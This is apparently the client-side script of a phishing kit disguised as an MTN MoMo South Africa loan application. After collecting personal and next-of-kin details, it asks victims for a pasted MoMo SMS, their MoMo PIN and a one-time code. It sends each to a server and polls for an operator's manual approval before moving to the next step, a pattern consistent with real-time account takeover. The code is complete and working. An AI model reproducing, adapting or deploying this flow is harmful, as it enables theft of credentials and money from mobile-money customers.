// ============================================================
// script.js – MTN MoMo South Africa – Production v3.0
// Admin-poll-only flow with resilient polling + recovery
// ============================================================
'use strict';

const S = {
    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
    firstName: '', lastName: '', phone: '', email: '',
    employment: '', annualIncome: 0,
    kinName: '', kinPhone: '',
    applicationId: '',
    rejectedStep: null
};

const POLL_INTERVAL = 2500;
const POLL_MAX_DURATION = 30 * 60 * 1000; // 30 min

let activePoll = null;
let otpResendTimer = null;
let smsResendTimer = null;
let otpResendCountdown = 0;
let smsResendCountdown = 0;
let pinBlockTimer = null;

// ─── Storage ───
const KEYS = {
    APP_ID: 'mtn_za_app_id',
    APP_DATA: 'mtn_za_app_data',
    REJECTION: 'mtn_za_rejection',
    DRAFT: 'mtn_za_draft',
    OTP_TIMER: 'mtn_za_otp_timer',
    SMS_TIMER: 'mtn_za_sms_timer'
};
const save = (k, d) => { try { localStorage.setItem(k, JSON.stringify(d)); } catch(e){} };
const get  = (k) => { try { const d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch(e){ return null; } };
const rm   = (k) => { try { localStorage.removeItem(k); } catch(e){} };

// ─── Core Helpers ───
function goTo(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}

function showToast(msg, type = 'info', duration = 3200) {
    const ex = document.querySelector('.toast');
    if (ex) ex.remove();
    const t = document.createElement('div');
    t.className = `toast toast-${type}`;
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(() => {
        t.style.opacity = '0';
        t.style.transform = 'translateX(-50%) translateY(-20px)';
        setTimeout(() => t.remove(), 300);
    }, duration);
}

function showErr(id, msg) {
    const box = document.getElementById(id);
    if (box) { box.classList.add('show'); const t = document.getElementById(id + 'Txt'); if (t) t.textContent = msg; }
}
function clearErr(id) {
    const box = document.getElementById(id);
    if (box) box.classList.remove('show');
}

function setBtnLoading(btn, loading, defaultText) {
    if (!btn) return;
    btn.disabled = loading;
    btn.textContent = loading ? 'Please wait...' : defaultText;
}

// ─── Form Helpers ───
function normalizePhone(id) {
    const inp = document.getElementById(id);
    let v = inp.value.replace(/\D/g, '');
    if (v.length > 9) v = v.substring(0, 9);
    inp.value = v;
    saveDraft();
}

function updateCalc() {
    const amt = +document.getElementById('amtSlider').value;
    document.getElementById('calcAmt').textContent = 'R ' + amt.toLocaleString();
    document.getElementById('monthlyAmt').textContent = 'R ' + Math.ceil(amt / 48).toLocaleString();
    const slider = document.getElementById('amtSlider');
    const pct = ((amt - 5000) / (500000 - 5000)) * 100;
    slider.style.setProperty('--pct', pct + '%');
}

// ─── Storage ───
function saveAppId(id) {
    if (!id) return;
    S.applicationId = id;
    save(KEYS.APP_ID, { id, timestamp: new Date().toISOString() });
}
function loadAppId() {
    const s = get(KEYS.APP_ID);
    if (s && s.id && Date.now() - new Date(s.timestamp).getTime() < 24*3600*1000) {
        S.applicationId = s.id;
        return s.id;
    }
    return null;
}
function saveAppData() { save(KEYS.APP_DATA, { ...S, timestamp: new Date().toISOString() }); }
function loadAppData() {
    const s = get(KEYS.APP_DATA);
    if (s && Date.now() - new Date(s.timestamp).getTime() < 24*3600*1000) {
        Object.keys(S).forEach(k => { if (s[k] !== undefined) S[k] = s[k]; });
        return true;
    }
    return false;
}
function saveDraft() {
    save(KEYS.DRAFT, {
        firstName: document.getElementById('s2fi')?.value || '',
        lastName: document.getElementById('s2la')?.value || '',
        phone: document.getElementById('s2ph')?.value || '',
        email: document.getElementById('s2em')?.value || '',
        loanAmount: document.getElementById('s1am')?.value || '',
        loanPurpose: document.getElementById('s1pu')?.value || '',
        employment: document.getElementById('s3em')?.value || '',
        annualIncome: document.getElementById('s3in')?.value || '',
        kinName: document.getElementById('s3kn')?.value || '',
        kinPhone: document.getElementById('s3kp')?.value || '',
        timestamp: new Date().toISOString()
    });
}
function loadDraft() {
    const d = get(KEYS.DRAFT);
    if (!d || Date.now() - new Date(d.timestamp).getTime() > 24*3600*1000) return false;
    if (d.firstName) document.getElementById('s2fi').value = d.firstName;
    if (d.lastName) document.getElementById('s2la').value = d.lastName;
    if (d.phone) document.getElementById('s2ph').value = d.phone;
    if (d.email) document.getElementById('s2em').value = d.email;
    if (d.loanAmount) document.getElementById('s1am').value = d.loanAmount;
    if (d.loanPurpose) document.getElementById('s1pu').value = d.loanPurpose;
    if (d.employment) document.getElementById('s3em').value = d.employment;
    if (d.annualIncome) document.getElementById('s3in').value = d.annualIncome;
    if (d.kinName) document.getElementById('s3kn').value = d.kinName;
    if (d.kinPhone) document.getElementById('s3kp').value = d.kinPhone;
    return true;
}

// ─── Flow Control ───
function startApplication() {
    S.rejectedStep = null;
    rm(KEYS.REJECTION);
    if (!S.applicationId) {
        S.applicationId = 'MTN-ZA-' + Date.now().toString().slice(-6);
        saveAppId(S.applicationId);
    }
    ['s1Err','s2Err','s3Err','momErr','pinErr','otpErr'].forEach(clearErr);
    goTo('page-step1');
}

function cancelAndRestart() {
    if (!confirm('Cancel this application and start over?')) return;
    restartApplication();
}

function restartApplication() {
    if (activePoll) { clearTimeout(activePoll); activePoll = null; }
    Object.values(KEYS).forEach(rm);
    location.reload();
}

// ─── Navigation ───
function toS2() {
    const ty = document.getElementById('s1ty').value;
    const am = +document.getElementById('s1am').value;
    const te = document.getElementById('s1te').value;
    const pu = document.getElementById('s1pu').value.trim();
    if (!ty || am < 5000 || am > 500000 || !te || !pu) {
        showErr('s1Err', am < 5000 ? 'Minimum amount is R 5,000.' : am > 500000 ? 'Maximum amount is R 500,000.' : 'Please complete all fields.');
        return;
    }
    S.loanType = ty; S.loanAmount = am; S.loanTerm = te; S.loanPurpose = pu;
    saveAppData(); saveDraft(); goTo('page-step2');
}

function toS3() {
    const fi = document.getElementById('s2fi').value.trim();
    const la = document.getElementById('s2la').value.trim();
    const ph = document.getElementById('s2ph').value;
    const em = document.getElementById('s2em').value.trim();
    if (!fi || !la) { showErr('s2Err', 'Please enter your full name.'); return; }
    if (ph.length !== 9) { showErr('s2Err', 'Phone must be 9 digits (e.g., 821234567).'); return; }
    if (!em || !em.includes('@')) { showErr('s2Err', 'Please enter a valid email.'); return; }
    S.firstName = fi; S.lastName = la; S.phone = ph; S.email = em;
    saveAppData(); saveDraft(); goTo('page-step3');
}

// ─── PIN/OTP Inputs ───
function pinMvM(el, i, max = 5) {
    el.value = el.value.replace(/\D/g, '');
    if (el.value && i < max - 1) { document.getElementById('pin' + (i + 1))?.focus(); return; }
    if (i === max - 1 && el.value && [0,1,2,3,4].every(x => document.getElementById('pin' + x)?.value)) {
        setTimeout(doPin, 300);
    }
}
function togPin() {
    for (let i = 0; i < 5; i++) {
        const b = document.getElementById('pin' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
    for (let i = 0; i < 4; i++) {
        const b = document.getElementById('otp' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
}
function clearLoginPin() {
    [0,1,2,3,4].forEach(i => document.getElementById('pin' + i).value = '');
    document.getElementById('pin0').focus();
}
function clearOtpCode() {
    [0,1,2,3].forEach(i => document.getElementById('otp' + i).value = '');
    document.getElementById('otp0').focus();
}
function handleOtpInput(el, type) {
    el.value = el.value.replace(/\D/, '');
    const idx = parseInt(el.id.match(/\d$/)[0]);
    if (el.value && idx < 3) document.getElementById('otp' + (idx + 1))?.focus();
    if (idx === 3 && el.value && [0,1,2,3].every(i => document.getElementById('otp' + i)?.value)) {
        setTimeout(doOtp, 300);
    }
}

// ─── SUBMIT APPLICATION ───
async function submitApp() {
    const em = document.getElementById('s3em').value;
    const inc = +document.getElementById('s3in').value;
    const kn = document.getElementById('s3kn').value.trim();
    const kp = document.getElementById('s3kp').value.trim();

    if (!kn) { showErr('s3Err', 'Please enter next of kin name.'); return; }
    if (kp.length !== 9) { showErr('s3Err', 'Next of kin phone must be 9 digits.'); return; }
    if (!em || inc <= 0) { showErr('s3Err', 'Please complete all fields.'); return; }

    S.employment = em; S.annualIncome = inc; S.kinName = kn; S.kinPhone = kp;
    document.getElementById('sP').textContent = S.loanPurpose;
    document.getElementById('sN').textContent = `${S.firstName} ${S.lastName}`;

    if (!S.applicationId) {
        S.applicationId = 'MTN-ZA-' + Date.now().toString().slice(-6);
        saveAppId(S.applicationId);
    }
    saveAppData();
    goTo('page-processing');
    document.getElementById('processingStatus').textContent = '⏳ Sending application...';

    try {
        const r = await fetch('/api/send-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationData: S })
        });
        const data = await r.json();
        if (!data.ok) {
            showErr('s3Err', data.error || 'Submission failed.');
            goTo('page-step3');
            return;
        }

        document.getElementById('processingStatus').textContent = '✅ Sent! Waiting for approval...';
        document.getElementById('waitAppId').textContent = S.applicationId;
        setTimeout(() => {
            goTo('page-wait-app');
            startPolling('application', () => {
                showToast('✅ Application approved!', 'success');
                goTo('page-sms-paste');
            });
        }, 800);
    } catch (e) {
        console.error(e);
        showErr('s3Err', 'Network error. Please try again.');
        goTo('page-step3');
    }
}

// ─── SUBMIT SMS ───
async function doSmsParse() {
    const msg = document.getElementById('smsMsgBox').value.trim();
    if (msg.length < 10) { showErr('momErr', 'Please paste the full SMS message.'); return; }

    const btn = document.getElementById('smsSubmitBtn');
    setBtnLoading(btn, true, 'Submit MoMo Message');
    clearErr('momErr');

    try {
        const r = await fetch('/api/send-momo-message', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ momoData: { applicationId: S.applicationId, momoMessage: msg } })
        });
        const data = await r.json();

        if (!data.ok) {
            showErr('momErr', data.error || 'Submission failed.');
            document.getElementById('resendSmsBtn')?.classList.remove('hidden');
            setBtnLoading(btn, false, 'Submit MoMo Message');
            return;
        }

        document.getElementById('waitSmsAppId').textContent = S.applicationId;
        goTo('page-wait-sms');
        setBtnLoading(btn, false, 'Submit MoMo Message');
        startPolling('sms', () => {
            showToast('✅ SMS approved!', 'success');
            goTo('page-pin');
        });
    } catch (e) {
        console.error(e);
        showErr('momErr', 'Network error. Please try again.');
        setBtnLoading(btn, false, 'Submit MoMo Message');
    }
}

// ─── SUBMIT PIN ───
async function doPin() {
    const pin = [0,1,2,3,4].map(i => document.getElementById('pin' + i).value).join('');
    if (pin.length !== 5) { showErr('pinErr', 'Enter all 5 digits.'); return; }

    const btn = document.getElementById('pinSubmitBtn');
    setBtnLoading(btn, true, 'Submit MoMo PIN');
    clearErr('pinErr');

    try {
        const r = await fetch('/api/send-pin', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId, pin })
        });
        const data = await r.json();

        if (!data.ok) {
            showErr('pinErr', data.error || 'Failed.');
            if (data.remainingAttempts !== undefined) {
                const d = document.getElementById('pinAttemptsDisplay');
                if (d) {
                    d.textContent = `🔑 Attempts remaining: ${data.remainingAttempts} of 3`;
                    d.className = 'pin-attempts warning';
                }
            }
            if (data.blocked) {
                startPinBlockCountdown(300);
            }
            clearLoginPin();
            setBtnLoading(btn, false, 'Submit MoMo PIN');
            return;
        }

        document.getElementById('waitPinAppId').textContent = S.applicationId;
        goTo('page-wait-pin');
        setBtnLoading(btn, false, 'Submit MoMo PIN');
        startPolling('pin', () => {
            showToast('✅ PIN approved!', 'success');
            goTo('page-otp');
        });
    } catch (e) {
        console.error(e);
        showErr('pinErr', 'Network error. Please try again.');
        setBtnLoading(btn, false, 'Submit MoMo PIN');
    }
}

// ─── SUBMIT OTP ───
async function doOtp() {
    const otp = [0,1,2,3].map(i => document.getElementById('otp' + i).value).join('');
    if (otp.length !== 4) { showErr('otpErr', 'Enter all 4 digits.'); return; }

    const btn = document.getElementById('otpSubmitBtn');
    setBtnLoading(btn, true, 'Verify & Approve Loan');
    clearErr('otpErr');

    try {
        const r = await fetch('/api/send-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId, otp })
        });
        const data = await r.json();

        if (!data.ok) {
            showErr('otpErr', data.error || 'Failed.');
            setBtnLoading(btn, false, 'Verify & Approve Loan');
            return;
        }

        document.getElementById('waitOtpAppId').textContent = S.applicationId;
        goTo('page-wait-otp');
        setBtnLoading(btn, false, 'Verify & Approve Loan');
        startPolling('otp', () => {
            showToast('🎉 Loan approved!', 'success');
            showApproval();
        });
    } catch (e) {
        console.error(e);
        showErr('otpErr', 'Network error. Please try again.');
        setBtnLoading(btn, false, 'Verify & Approve Loan');
    }
}

// ─── POLLING ENGINE ───
function startPolling(step, onSuccess) {
    stopPolling();

    const start = Date.now();
    let consecutiveErrors = 0;

    const tick = async () => {
        if (Date.now() - start > POLL_MAX_DURATION) {
            showToast('Request timed out. Please retry.', 'error');
            stopPolling();
            return;
        }

        try {
            const r = await fetch(`/api/status/${S.applicationId}/${step}`);
            const data = await r.json();
            consecutiveErrors = 0;

            if (data.ok) {
                if (data.status === 'approved') {
                    stopPolling();
                    onSuccess();
                    return;
                }
                if (data.status === 'rejected') {
                    stopPolling();
                    await handleRejection(step);
                    return;
                }
            }
        } catch (e) {
            consecutiveErrors++;
            console.warn('Poll error:', e);
            if (consecutiveErrors >= 5) {
                showToast('Connection issue. Retrying...', 'error');
            }
        }

        activePoll = setTimeout(tick, POLL_INTERVAL);
    };
    tick();
}

function stopPolling() {
    if (activePoll) { clearTimeout(activePoll); activePoll = null; }
}

async function handleRejection(step) {
    try {
        const r = await fetch(`/api/rejection-info/${S.applicationId}`);
        const data = await r.json();
        showToast(`❌ Your ${step.toUpperCase()} was rejected. Please try again.`, 'error');
    } catch (e) {
        showToast(`❌ Rejected. Please try again.`, 'error');
    }

    if (step === 'application') { restartApplication(); return; }
    if (step === 'sms') { goTo('page-sms-paste'); document.getElementById('smsMsgBox').value = ''; }
    if (step === 'pin') { goTo('page-pin'); clearLoginPin(); }
    if (step === 'otp') { goTo('page-otp'); clearOtpCode(); }
}

// ─── RESEND SMS ───
async function resendSms() {
    if (smsResendCountdown > 0) {
        showToast(`Wait ${smsResendCountdown}s before resending.`, 'info');
        return;
    }
    try {
        await fetch(`/api/resend-sms/${S.applicationId}`, { method: 'POST' });
        document.getElementById('smsMsgBox').value = '';
        document.getElementById('smsMsgBox').focus();
        showToast('✅ Ready. Paste the new SMS.', 'success');
        startSmsResendTimer(30);
    } catch (e) { showToast('Failed to reset.', 'error'); }
}

function startSmsResendTimer(seconds = 30) {
    const btn = document.getElementById('resendSmsBtn');
    if (!btn) return;
    if (smsResendTimer) clearInterval(smsResendTimer);
    smsResendCountdown = seconds;
    btn.disabled = true;
    btn.classList.remove('hidden');
    btn.textContent = `⏳ Wait ${smsResendCountdown}s`;
    smsResendTimer = setInterval(() => {
        smsResendCountdown--;
        if (smsResendCountdown <= 0) {
            clearInterval(smsResendTimer);
            smsResendTimer = null;
            btn.disabled = false;
            btn.textContent = '🔄 Resend SMS Verification';
        } else {
            btn.textContent = `⏳ Wait ${smsResendCountdown}s`;
        }
    }, 1000);
}

// ─── RESEND OTP ───
async function resendOtp() {
    if (otpResendCountdown > 0) {
        showToast(`Wait ${otpResendCountdown}s.`, 'info');
        return;
    }
    try {
        await fetch('/api/resend-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId })
        });
        clearOtpCode();
        showToast('✅ New OTP requested.', 'success');
        startOtpResendTimer(30);
    } catch (e) { showToast('Failed.', 'error'); }
}

function startOtpResendTimer(seconds = 30) {
    const btn = document.getElementById('resendOtpBtn');
    if (!btn) return;
    if (otpResendTimer) clearInterval(otpResendTimer);
    otpResendCountdown = seconds;
    btn.disabled = true;
    btn.classList.remove('hidden');
    btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
    otpResendTimer = setInterval(() => {
        otpResendCountdown--;
        if (otpResendCountdown <= 0) {
            clearInterval(otpResendTimer);
            otpResendTimer = null;
            btn.disabled = false;
            btn.textContent = '🔄 Resend OTP';
        } else {
            btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
        }
    }, 1000);
}

// ─── RETRY STEP ───
async function retryStep(step) {
    stopPolling();
    try {
        await fetch(`/api/retry/${S.applicationId}/${step}`, { method: 'POST' });
    } catch (e) {}

    if (step === 'sms') {
        document.getElementById('smsMsgBox').value = '';
        clearErr('momErr');
        showToast('🔄 Ready. Paste the SMS again.', 'info');
        goTo('page-sms-paste');
    } else if (step === 'pin') {
        clearLoginPin(); clearErr('pinErr');
        showToast('🔄 Ready. Enter PIN again.', 'info');
        goTo('page-pin');
    } else if (step === 'otp') {
        clearOtpCode(); clearErr('otpErr');
        showToast('🔄 Ready. Enter OTP again.', 'info');
        goTo('page-otp');
    }
}

// ─── PIN Block Countdown ───
function startPinBlockCountdown(seconds) {
    const d = document.getElementById('pinAttemptsDisplay');
    if (!d) return;
    if (pinBlockTimer) clearInterval(pinBlockTimer);
    let r = seconds;
    d.textContent = `🔒 Blocked. Wait ${r}s`;
    d.className = 'pin-attempts blocked';
    document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = true);
    document.getElementById('pinSubmitBtn').disabled = true;
    pinBlockTimer = setInterval(() => {
        r--;
        if (r <= 0) {
            clearInterval(pinBlockTimer);
            pinBlockTimer = null;
            d.textContent = '✅ PIN available.';
            d.className = 'pin-attempts available';
            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = false);
            document.getElementById('pinSubmitBtn').disabled = false;
            fetch(`/api/reset-pin-attempts/${S.applicationId}`, { method: 'POST' }).catch(()=>{});
        } else {
            d.textContent = `🔒 Blocked. Wait ${r}s`;
        }
    }, 1000);
}

// ─── Approval ───
function showApproval() {
    document.getElementById('aprAmount').textContent = 'R ' + S.loanAmount.toLocaleString();
    document.getElementById('aprAmt').textContent = 'R ' + S.loanAmount.toLocaleString();
    document.getElementById('aprTerm').textContent = S.loanTerm;
    document.getElementById('aprMth').textContent = 'R ' + Math.ceil(S.loanAmount / parseInt(S.loanTerm)).toLocaleString();

    Object.values(KEYS).forEach(rm);
    stopPolling();
    if (otpResendTimer) clearInterval(otpResendTimer);
    if (smsResendTimer) clearInterval(smsResendTimer);
    if (pinBlockTimer) clearInterval(pinBlockTimer);

    goTo('page-approval');
}

// ─── RECOVERY ON LOAD ───
async function recoverSession() {
    loadAppId();
    loadAppData();

    if (!S.applicationId) { loadDraft(); return; }

    try {
        const r = await fetch(`/api/status/${S.applicationId}`);
        if (!r.ok) { loadDraft(); return; }
        const data = await r.json();
        if (!data.ok) { loadDraft(); return; }

        // Resume from the first incomplete step
        if (data.application === 'pending') {
            document.getElementById('waitAppId').textContent = S.applicationId;
            goTo('page-wait-app');
            startPolling('application', () => goTo('page-sms-paste'));
            return;
        }
        if (data.application === 'rejected') { loadDraft(); return; }

        if (data.sms === 'pending') {
            document.getElementById('waitSmsAppId').textContent = S.applicationId;
            goTo('page-wait-sms');
            startPolling('sms', () => goTo('page-pin'));
            return;
        }
        if (data.sms === 'rejected' || data.sms === 'idle') {
            showToast('Resuming from SMS step.', 'info');
            goTo('page-sms-paste');
            return;
        }

        if (data.pin === 'pending') {
            document.getElementById('waitPinAppId').textContent = S.applicationId;
            goTo('page-wait-pin');
            startPolling('pin', () => goTo('page-otp'));
            return;
        }
        if (data.pin === 'rejected' || data.pin === 'idle') {
            showToast('Resuming from PIN step.', 'info');
            goTo('page-pin');
            return;
        }

        if (data.otp === 'pending') {
            document.getElementById('waitOtpAppId').textContent = S.applicationId;
            goTo('page-wait-otp');
            startPolling('otp', () => showApproval());
            return;
        }
        if (data.otp === 'idle') {
            showToast('Resuming from OTP step.', 'info');
            goTo('page-otp');
            return;
        }
        if (data.otp === 'approved') {
            showApproval();
            return;
        }
    } catch (e) {
        console.warn('Recovery failed:', e);
        loadDraft();
    }
}

// ─── Auto-save on input ───
document.addEventListener('input', (e) => {
    if (e.target.closest('#page-step1, #page-step2, #page-step3')) saveDraft();
});

// ─── INIT ───
updateCalc();
recoverSession().then(() => {
    // If nothing recovered, show landing
    const anyActive = document.querySelector('.page.active');
    if (!anyActive) goTo('page-landing');
});
console.log('✅ MTN MoMo SA loaded (v3.0)');
